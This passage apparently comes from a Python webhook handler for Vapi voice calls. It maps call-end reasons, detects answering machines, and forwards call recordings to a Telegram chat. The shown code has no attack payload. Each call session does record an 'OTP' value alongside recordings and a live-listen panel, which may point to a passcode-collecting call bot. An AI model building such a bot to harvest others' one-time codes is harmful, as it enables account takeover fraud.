        if session and session.get("call_ended_processed"):
            logger.info("[VAPI_CALL_ENDED] already processed for call_sid=%s, skipping duplicate", call_sid)
            return Response("OK")
        # Flag early: Vapi fires end-of-call-report and status-update("ended")
        # concurrently; without this the second event reprocesses and re-sends
        # the completion menu + recording.
        if session:
            session["call_ended_processed"] = True

        if status == "queued":
            if session and session.get("call_was_in_progress"):
                logger.info("[VAPI_CALL_ENDED] call was in-progress, overriding 'queued' status")
                status = "ended"
            elif ended_reason:
                reason_to_status = {
                    "customer-ended-call": "completed",
                    "assistant-ended-call": "completed",
                    "customer-did-not-answer": "no-answer",
                    "customer-busy": "busy",
                    "customer-did-not-respond": "completed",
                    "assistant-error": "failed",
                    "pipeline-error": "failed",
                    "silence-timed-out": "completed",
                }
                mapped = reason_to_status.get(ended_reason)
                if mapped:
                    logger.info("[VAPI_CALL_ENDED] remapped status from '%s' to '%s' using endedReason='%s'",
                                 status, mapped, ended_reason)
                    status = mapped

        logger.info("[VAPI_CALL_ENDED] call_sid=%s duration=%ss status=%s endedReason=%s",
                     call_sid, duration_s, status, ended_reason)

        metadata = _extract_metadata(payload, call_data)
        chat_id = metadata.get("chat_id") or _resolve_chat_id(payload, call_sid, vapi_call_id, call_data)
        user_id = metadata.get("user_id")

        # Vapi AMD / voicemail detection results are surfaced via the machine
        # handler below; human/no-answer/busy notices are covered by the status
        # updates, so nothing extra is posted from here.
        if session:
            session["answered_by"] = ended_reason or session.get("answered_by")
        is_machine_end = bool(ended_reason) and ended_reason.lower() in _MACHINE_ENDED_REASONS

        if is_machine_end:
            _handle_machine_detected(
                payload,
                call_sid,
                vapi_call_id,
                call_data,
                kind="Machine",
                snippet=ended_reason,
            )

        recording_url = _extract_recording_url(payload, call_data)

        try:
            from services.analytics import finalize_call_history
            finalize_call_history(
                user_id,
                call_sid,
                vapi_call_id=vapi_call_id,
                status=status,
                duration_s=duration_s,
                ended_reason=ended_reason,
                otp=(session or {}).get("otp") or "",
                recording=bool(recording_url),
                session=session,
            )
        except Exception:
            logger.exception("[VAPI_ANALYTICS] failed to finalize call history")

        if chat_id:
            try:
                send_call_complete_menu(int(chat_id))
            except Exception:
                pass

        if chat_id:
            if recording_url:
                logger.info("[VAPI_CALL_ENDED] recording url found in webhook, triggering download")
                threading.Thread(
                    target=_download_and_send_recording,
                    args=(recording_url, call_sid, vapi_call_id, chat_id, user_id),
                    daemon=True,
                ).start()
            elif vapi_call_id:
                logger.info("[VAPI_CALL_ENDED] no recording url in webhook, fetching from Vapi API")
                threading.Thread(
                    target=_fetch_and_send_recording_via_api,
                    args=(vapi_call_id, call_sid, chat_id, user_id),
                    daemon=True,
                ).start()
            else:
                logger.info("[VAPI_CALL_ENDED] no recording url and no vapi_call_id to fetch")

        return Response("OK")
    except Exception as e:
        logger.error("[VAPI_CALL_ENDED_ERROR] %s", e)
        return Response("OK")


def _fetch_and_send_recording_via_api(vapi_call_id: str, call_sid: Optional[str], chat_id: int, user_id: Optional[str]):
    try:
        from services.vapi_service import get_call, VapiError
        try:
            call_data = get_call(vapi_call_id)
        except VapiError as e:
            logger.error("[VAPI_RECORDING_API] Cannot fetch recording: %s", e)
            _send_telegram(chat_id, "⚠️ Recording unavailable - Vapi API key not configured.")
            return
        if not call_data:
            logger.warning("[VAPI_RECORDING_API] get_call returned nothing for %s", vapi_call_id)
            _send_telegram(chat_id, "⚠️ Recording not available via API.")
            return
        recording_url = (
            call_data.get("recordingUrl")
            or (call_data.get("artifact") or {}).get("recordingUrl")
        )
        if not recording_url:
            logger.warning("[VAPI_RECORDING_API] no recordingUrl in fetched call data for %s", vapi_call_id)
            return
        logger.info("[VAPI_RECORDING_API] got recording url from API for %s", vapi_call_id)
        _download_and_send_recording(recording_url, call_sid, vapi_call_id, chat_id, user_id)
    except Exception as e:
        logger.error("[VAPI_RECORDING_API_ERROR] %s", e)
        if chat_id:
            _send_telegram(chat_id, "⚠️ Failed to fetch recording.")


def _download_and_send_recording(recording_url: str, call_sid: Optional[str], vapi_call_id: Optional[str], chat_id: int, user_id: Optional[str]):
    audio_data = _download_recording_file(recording_url, vapi_call_id)
    if not audio_data:
        logger.error("[VAPI_RECORDING] download failed for %s", recording_url[:80])
        return

    MAX_TELEGRAM_SIZE = 50 * 1024 * 1024
    if len(audio_data) > MAX_TELEGRAM_SIZE:
        logger.warning("[VAPI_RECORDING] file too large for Telegram: %s bytes", len(audio_data))
        _send_telegram(chat_id, f"⚠️ Recording too large for Telegram ({len(audio_data)//1024//1024}MB). Save URL: {recording_url}")
        return

    ext = ".wav"
    if "stereo.wav" in recording_url or ".wav" in recording_url:
        ext = ".wav"
    elif ".mp3" in recording_url:
        ext = ".mp3"
    elif ".ogg" in recording_url:
        ext = ".ogg"

    if user_id:
        try:
            from core.files import ensure_user_path, user_conf_path
            ensure_user_path(user_id)
            # `record.mp3` is what the Live Listen panel / Download Recording
            # button looks for; write both so legacy paths keep working.
            file_path = str(user_conf_path(user_id) / f"record{ext}")
            with open(file_path, "wb") as f:
                f.write(audio_data)
            legacy_path = str(user_conf_path(user_id) / f"recording{ext}")
            with open(legacy_path, "wb") as f:
                f.write(audio_data)
            logger.info("[VAPI_RECORDING] saved to %s", file_path)
        except Exception as e:
            logger.warning("[VAPI_RECORDING] failed to save locally: %s", e)

    sent = _send_audio_to_telegram(int(chat_id), audio_data, call_sid, ext)
    if not sent:
        _send_telegram(chat_id, f"✅ Call completed. Recording saved to disk ({ext}).")
    try:
        from services.analytics import mark_call_recording
        mark_call_recording(user_id, call_sid, vapi_call_id)
    except Exception:
        pass
    try:
        from bot import send_call_complete_menu
        send_call_complete_menu(int(chat_id))
    except Exception:
        pass


def _handle_recording(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str], call_data: Optional[dict] = None) -> Response:
    try:
        recording_url = _extract_recording_url(payload, call_data)
        if not recording_url:
            logger.info("[VAPI_RECORDING] no recordingUrl in payload")
            if vapi_call_id:
                metadata = _extract_metadata(payload, call_data)
                chat_id = metadata.get("chat_id")
                user_id = metadata.get("user_id")
                if chat_id:
                    threading.Thread(
                        target=_fetch_and_send_recording_via_api,
                        args=(vapi_call_id, call_sid, chat_id, user_id),
                        daemon=True,
                    ).start()
            return Response("OK")

        metadata = _extract_metadata(payload, call_data)
        chat_id = metadata.get("chat_id")
        user_id = metadata.get("user_id")

        logger.info("[VAPI_RECORDING] url=%s chat_id=%s user_id=%s", recording_url[:80], chat_id, user_id)

        if chat_id:
            threading.Thread(
                target=_download_and_send_recording,
                args=(recording_url, call_sid, vapi_call_id, chat_id, user_id),
                daemon=True,
            ).start()
        return Response("OK")
    except Exception as e:
        logger.error("[VAPI_RECORDING_ERROR] %s", e)
        return Response("OK")
